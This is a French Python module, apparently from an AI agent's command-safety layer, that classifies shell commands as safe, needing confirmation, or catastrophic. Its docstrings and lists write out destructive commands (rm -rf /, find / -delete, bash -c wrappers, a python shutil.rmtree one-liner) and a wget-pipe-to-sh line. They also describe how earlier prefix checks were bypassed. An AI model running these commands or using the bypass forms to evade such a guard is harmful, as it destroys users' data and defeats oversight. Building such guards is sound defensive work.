"""Ce qu'une commande shell a le droit de faire sans qu'on demande.

L'ancienne détection comparait le PRÉFIXE de la chaîne à une liste. Mesuré sur
quatorze formulations destructrices, neuf ne déclenchaient rien :

    RIEN  cd /tmp && rm -rf x        RIEN  bash -c "rm -rf /tmp/x"
    RIEN  /bin/rm -rf /tmp/x         RIEN  eval "rm -rf /tmp/x"
    RIEN  find /tmp -delete          RIEN  nohup rm -rf /tmp/x
    RIEN  git -C /repo clean -fdx    RIEN  X=1 rm -rf /tmp/x

Aucune n'est un contournement : ce sont des tournures qu'un modèle produit
spontanément. Même le rempart censé refuser JUSQU'AVEC confirmation laissait
passer `/bin/rm -rf /` et `cd / && rm -rf *` — cinq formulations sur huit.

DEUX CHANGEMENTS
----------------
1. On repère le mot en POSITION DE COMMANDE dans chaque segment, pas le début de
   la chaîne. Séparateurs, affectations en tête, enveloppes (`sudo`, `nohup`,
   `env`…) et chemins absolus sont retirés avant comparaison.

2. Le défaut s'inverse : inconnu → CONFIRMATION, au lieu de inconnu → exécution.
   Un oubli devient une question posée au lieu d'un silence.

POURQUOI UNE HEURISTIQUE ICI, ALORS QU'UN PARSEUR SHELL A ÉTÉ REFUSÉ AILLEURS
-----------------------------------------------------------------------------
Pour DÉCOUPER une commande composée (cf. `ecriture.py`), les deux erreurs
coûtaient : sur-refuser bloquait du travail légitime, sous-refuser exécutait un
acte non montré. Seul un vrai parseur donnait la garantie — d'où le refus.

Pour DÉTECTER, l'asymétrie s'inverse : sur-détecter coûte un clic, sous-détecter
coûte des données. Un filet volontairement trop large est donc le bon outil. Et
le problème est plus faible qu'un parsing : on ne cherche pas à comprendre la
commande, seulement à savoir quels mots occupent la position de commande.

CE QUE ÇA N'ACHÈTE PAS
----------------------
`python3 -c "import shutil; shutil.rmtree('/')"` ne contient AUCUN verbe shell
destructeur. Ce n'est pas une enveloppe de plus à ajouter : c'est une classe
entière qu'une détection par motif ne peut pas voir. Idem pour un alias, une
fonction shell, ou un script au nom anodin.

Ce module protège donc des ACCIDENTS — le modèle qui écrit `cd /projet && rm -rf
build` sans y penser, cas de loin le plus fréquent. Il ne protège pas d'un
adversaire qui cherche à contourner, par exemple via une injection dans une page
lue par l'agent. Pour ce modèle de menace, la réponse n'est pas un meilleur
motif : c'est un bac à sable.
"""
from __future__ import annotations

import re
from pathlib import PurePosixPath, PureWindowsPath

#: Verbes qui détruisent, toutes familles d'OS confondues. L'union plutôt que le
#: choix selon l'OS détecté : une détection qui se trompe (conteneur, WSL, shell
#: POSIX sous Windows) désarmerait le garde, alors qu'un `del /f` vu sous Linux
#: ne coûte qu'une confirmation de trop.
VERBES_DESTRUCTEURS: frozenset[str] = frozenset({
    # POSIX
    "rm", "rmdir", "shred", "mkfs", "dd", "truncate", "unlink", "wipefs",
    # PowerShell
    "remove-item", "ri", "rmo", "clear-disk", "format-volume", "clear-content",
    # cmd.exe
    "del", "erase", "rd", "format", "diskpart", "takeown", "icacls", "cipher",
})

#: Sous-commandes destructrices d'outils par ailleurs anodins. `git` est utile
#: cent fois par jour ; `git clean -fdx` efface le travail non commité.
SOUS_COMMANDES_DESTRUCTRICES: dict[str, tuple[tuple[str, ...], ...]] = {
    "git":     (("clean",), ("reset", "--hard"), ("push", "--force"),
                ("push", "-f"), ("branch", "-D"), ("checkout", "--force")),
    "pip":     (("uninstall",),),
    "pip3":    (("uninstall",),),
    "npm":     (("uninstall",), ("unpublish",)),
    "pnpm":    (("uninstall",), ("remove",)),
    "yarn":    (("remove",),),
    "pacman":  (("-R",), ("-Rns",), ("-Rs",), ("-Rdd",), ("-Scc",)),
    "yay":     (("-R",), ("-Rns",), ("-Rs",), ("-Scc",)),
    "apt":     (("remove",), ("purge",), ("autoremove",)),
    "apt-get": (("remove",), ("purge",), ("autoremove",)),
    "dnf":     (("remove",), ("erase",)),
    "zypper":  (("remove",), ("rm",)),
    "apk":     (("del",),),
    "brew":    (("uninstall",), ("remove",)),
    "winget":  (("uninstall",),),
    "docker":  (("system", "prune"), ("volume", "rm"), ("rmi",)),
    "kubectl": (("delete",),),
}

#: Options qui rendent destructrice une commande qui ne l'est pas. `find` seul
#: lit ; `find -delete` efface.
OPTIONS_DESTRUCTRICES: dict[str, tuple[str, ...]] = {
    "find":  ("-delete", "-exec"),
    "rsync": ("--delete", "--delete-after", "--delete-before"),
}

#: Enveloppes : elles s'effacent devant la commande qu'elles portent. Une liste
#: finie par nature — d'où le défaut inversé, qui la rend non critique : ce
#: qu'elle rate devient une confirmation, pas une exécution silencieuse.
_ENVELOPPES: frozenset[str] = frozenset({
    "sudo", "doas", "nohup", "time", "env", "command", "exec", "nice",
    "ionice", "timeout", "stdbuf", "setsid", "xargs", "watch", "script",
})

#: Enveloppes qui portent leur charge dans un ARGUMENT, pas en position suivante.
#: `bash -c "…"` doit être ouvert, sinon `bash -c "rm -rf /"` est un simple `bash`.
_ENVELOPPES_INLINE: frozenset[str] = frozenset({
    "bash", "sh", "zsh", "dash", "ksh", "fish", "eval", "source", ".",
    "powershell", "pwsh", "cmd",
})

#: Ce qui s'exécute SANS confirmation. Tout le reste en demande une.
#:
#: Cette liste est un compromis assumé, pas une garantie : `pytest` et `npm`
#: exécutent du code arbitraire, et un `python script.py` peut tout faire. Les
#: exiger en confirmation rendrait l'agent inutilisable pour ce qu'il fait le
#: plus — lancer des tests et des builds. L'inversion du défaut garde tout son
#: intérêt pour les binaires inconnus et les tournures inhabituelles, qui sont
#: le cas d'accident réel.
SANS_CONFIRMATION: frozenset[str] = frozenset({
    # Lire et inspecter
    "ls", "ll", "dir", "cat", "bat", "head", "tail", "less", "more", "wc",
    "grep", "rg", "egrep", "fgrep", "find", "fd", "locate", "file", "stat",
    "du", "df", "tree", "realpath", "readlink", "basename", "dirname",
    "diff", "cmp", "md5sum", "sha256sum", "sort", "uniq", "cut", "awk",
    "sed", "tr", "column", "jq", "yq", "xxd", "strings",
    # Contexte
    "pwd", "cd", "echo", "printf", "date", "whoami", "hostname", "uname",
    "which", "type", "whereis", "printenv", "id", "groups", "uptime",
    "ps", "top", "htop", "free", "lsof", "netstat", "ss", "ping",
    # Développement
    "git", "python", "python3", "node", "deno", "bun", "npm", "pnpm", "yarn",
    "npx", "pytest", "tox", "ruff", "mypy", "black", "eslint", "prettier",
    "make", "cargo", "go", "javac", "java", "mvn", "gradle", "php", "composer",
    "tsc", "vite", "webpack", "docker", "kubectl", "terraform",
    # Réseau en lecture
    "curl", "wget", "http", "ssh", "scp", "rsync", "gh", "aws",
})

#: Interpréteurs qui acceptent du code sur la ligne de commande. Le binaire est
#: sur la liste blanche — `python3 script.py` est le quotidien de l'agent — mais
#: `python3 -c "…"` porte du code qu'aucun motif shell ne sait lire. On ne peut
#: pas l'inspecter, donc on ne le déclare pas sûr : il demande confirmation.
_INTERPRETEURS = frozenset({"python", "python3", "perl", "ruby", "node", "deno",
                            "bun", "php", "bash", "sh", "zsh", "powershell", "pwsh"})
_CODE_EN_LIGNE = frozenset({"-c", "-e", "-E", "--eval", "-Command", "--command"})

_SEPARATEURS = re.compile(r"[;&|\n]+")
_AFFECTATION = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
_SUBSTITUTION = re.compile(r"\$\(([^()]*)\)|`([^`]*)`")


def _mot_de_commande(segment: str) -> tuple[str, list[str]]:
    """(verbe, arguments) d'un segment, enveloppes et chemins retirés.

    Rend ("", []) si le segment ne porte aucune commande.
    """
    jetons = segment.split()
    while jetons:
        jeton = jetons[0]
        # Affectation en tête : `X=1 rm -rf y`.
        if _AFFECTATION.match(jeton):
            jetons = jetons[1:]
            continue
        nu = _basename(jeton).lower()
        if nu in _ENVELOPPES:
            jetons = jetons[1:]
            # Les options de l'enveloppe et son éventuel argument numérique
            # (`timeout 30`, `nice -n 5`) ne sont pas la commande portée.
            while jetons and (jetons[0].startswith("-") or jetons[0].isdigit()):
                jetons = jetons[1:]
            continue
        return nu, jetons[1:]
    return "", []


def _basename(jeton: str) -> str:
    """`/bin/rm` → `rm`, `C:\\Windows\\System32\\del.exe` → `del`.

    Le chemin absolu était le contournement le plus simple de tous : la liste
    contenait « rm », la commande commençait par « /bin/rm ».
    """
    nu = jeton.strip().strip('"\'')
    nu = PurePosixPath(nu).name if "/" in nu else nu
    nu = PureWindowsPath(nu).name if "\\" in nu else nu
    return nu[:-4] if nu.lower().endswith(".exe") else nu


def _demasquer(commande: str) -> list[str]:
    """La commande, plus le contenu de ses substitutions et de ses `-c`.

    `bash -c "rm -rf /"` et `$(rm -rf /)` portent leur charge dans une chaîne :
    la traiter comme un simple argument revient à ne pas la lire du tout.
    """
    morceaux = [commande]
    for trouve in _SUBSTITUTION.finditer(commande):
        interne = trouve.group(1) or trouve.group(2) or ""
        if interne.strip():
            morceaux.append(interne)
    for segment in _SEPARATEURS.split(commande):
        jetons = segment.split()
        if not jetons:
            continue
        # `ssh hôte "rm -rf /var/log"` : la charge est derrière l'hôte. Sans
        # l'ouvrir, le verbe vu est `ssh`, qui est sur la liste blanche — donc
        # une suppression sur une machine distante s'exécutait sans un mot.
        if _basename(jetons[0]).lower() in ("ssh", "doas-ssh"):
            reste = jetons[1:]
            while reste and reste[0].startswith("-"):
                # Les options à valeur (-i, -p, -o, -F, -l) mangent leur argument.
                mange = reste[0] in ("-i", "-p", "-o", "-F", "-l", "-J", "-b", "-c")
                reste = reste[2:] if (mange and len(reste) > 1) else reste[1:]
            if len(reste) > 1:      # un hôte SEUL est une session interactive
                morceaux.append(" ".join(reste[1:]).strip('"\''))
            continue
        if _basename(jetons[0]).lower() in _ENVELOPPES_INLINE:
            # Ce qui suit `-c` / `-Command`, guillemets retirés.
            for i, jeton in enumerate(jetons[1:], start=1):
                if jeton.lower() in ("-c", "-command", "/c") and i + 1 < len(jetons):
                    morceaux.append(" ".join(jetons[i + 1:]).strip('"\''))
                    break
            else:
                reste = " ".join(jetons[1:]).strip('"\'')
                if reste:
                    morceaux.append(reste)
    return morceaux


def verbes_de(commande: str) -> list[tuple[str, list[str]]]:
    """Tous les (verbe, arguments) que cette commande met en position de commande."""
    trouves: list[tuple[str, list[str]]] = []
    for morceau in _demasquer(commande):
        for segment in _SEPARATEURS.split(morceau):
            verbe, args = _mot_de_commande(segment)
            if verbe:
                trouves.append((verbe, args))
    return trouves


def _est_destructeur(verbe: str, args: list[str]) -> bool:
    if verbe in VERBES_DESTRUCTEURS:
        return True
    # `mkfs` se décline par système de fichiers — `mkfs.ext4`, `mkfs.xfs`,
    # `mkfs.vfat`. Les énumérer serait une liste à rallonge et toujours en
    # retard ; le préfixe suffit et ne recouvre rien d'autre.
    if verbe.startswith("mkfs."):
        return True
    # La casse des ARGUMENTS est signifiante : `git branch -d` supprime une
    # branche fusionnée, `-D` l'impose. Abaisser les arguments confondait les
    # deux — et faisait rater `-D`, qui est la forme dangereuse.
    for sequence in SOUS_COMMANDES_DESTRUCTRICES.get(verbe, ()):
        if all(mot in args for mot in sequence):
            return True
    return any(o in args for o in OPTIONS_DESTRUCTRICES.get(verbe, ()))


def est_destructive(commande: str) -> bool:
    """Un verbe destructeur occupe-t-il une position de commande ?"""
    return any(_est_destructeur(v, a) for v, a in verbes_de(commande))


def est_connue_sure(commande: str) -> bool:
    """TOUS les verbes sont-ils sur la liste blanche, sans option destructrice ?

    « Tous » et pas « le premier » : `ls && wget http://x | sh` ne devient pas
    inoffensif parce qu'il commence par `ls`.
    """
    verbes = verbes_de(commande)
    if not verbes:
        return False
    return all(v in SANS_CONFIRMATION
               and not _est_destructeur(v, a)
               and not (v in _INTERPRETEURS and _CODE_EN_LIGNE & set(a))
               for v, a in verbes)


#: Cibles dont la suppression détruit le système ou le travail en cours. Refusées
#: même avec confirmation : aucune réponse « oui » ne rend `rm -rf /` acceptable.
CIBLES_CATASTROPHIQUES: frozenset[str] = frozenset({
    ".", "..", "/", "~", "*", "$home", "${home}", "$pwd", "${pwd}",
    "c:", "d:", "%userprofile%", "%homepath%", "%systemroot%",
    "$env:userprofile", "$env:homepath", "$env:systemroot", "*.*", "/*", "~/*",
})

#: Les verbes qui SUPPRIMENT, parmi les destructeurs. `dd` ou `mkfs` détruisent
#: aussi, mais leur cible ne se lit pas de la même façon.
_VERBES_SUPPRESSION = frozenset({
    "rm", "rmdir", "remove-item", "ri", "del", "erase", "rd", "shred", "unlink",
})


def est_catastrophique(commande: str) -> bool:
    """Suppression visant la racine, le home, le dossier courant ou un joker.

    Reposait sur un `re.match` ancré au DÉBUT de la chaîne. Mesuré : sur huit
    formulations, cinq passaient — `/bin/rm -rf /`, `cd / && rm -rf *`,
    `bash -c "rm -rf /"`, `nohup rm -rf ~ &`, `find / -delete`. Le rempart censé
    tenir même contre une confirmation était le plus facile à contourner.
    """
    for verbe, args in verbes_de(commande):
        cibles = [a for a in args if not a.startswith("-")]
        if verbe in _VERBES_SUPPRESSION:
            if any(_cible_catastrophique(c) for c in cibles):
                return True
        # `find / -delete` ne nomme pas sa cible en dernier mais en premier :
        # c'est le point de départ du parcours, et tout ce qu'il trouve y passe.
        elif verbe == "find" and {"-delete", "-exec"} & set(args) and cibles:
            if _cible_catastrophique(cibles[0]):
                return True
    return False


def _cible_catastrophique(argument: str) -> bool:
    nu = argument.strip().strip('"\'').lower()
    nu = nu.removeprefix("filesystem::")
    if nu in CIBLES_CATASTROPHIQUES:
        return True
    # `/`, `/*`, `~/`, `~/*` une fois la barre finale retirée.
    sans_barre = nu.rstrip("/").rstrip("\\")
    return (sans_barre or "/") in CIBLES_CATASTROPHIQUES
